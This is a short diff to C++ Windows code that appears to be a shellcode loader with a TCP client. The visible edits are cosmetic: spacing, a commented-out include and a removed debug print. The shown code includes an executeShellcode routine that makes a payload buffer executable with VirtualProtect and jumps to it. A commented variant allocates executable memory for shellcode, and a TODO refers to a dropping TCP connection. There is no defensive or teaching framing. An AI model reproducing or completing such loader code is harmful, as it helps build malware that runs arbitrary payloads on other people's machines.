@@ -61,7 +61,7 @@ bool Client::createSocket(int af, int type, int protocol)
 
 bool Client::createConnection(const std::string& host, const std::string& port)
 {
-    ADDRINFOA hints, *result= nullptr; // struct addrinfo 
+    ADDRINFOA hints, *result = nullptr; // struct addrinfo 
 
     ZeroMemory(&hints, sizeof(hints));
     // memset(&hints, 0, sizeof(hints)); // use this instead of zeromemory for cross platform
@@ -208,7 +208,7 @@ void executeShellcode(std::vector<uint8_t>& fart_shellcode) {
     VirtualFree(exec_mem, 0, MEM_RELEASE);
 }*/
 
-#include <vector>
+//#include <vector>
 
 // TODO: fix... add debugs, console/tcp connection dies everytime
 void executeShellcode() {
@@ -243,7 +243,6 @@ void executeShellcode() {
 	if (VirtualProtect(bPayload, 4096, PAGE_EXECUTE_READWRITE, &dwOldProtect))
 	{
 		(*(void (*)()) bPayload)();
-		std::cout << "VirtualProtect success" << std::endl;
 	}
 	else
 	{
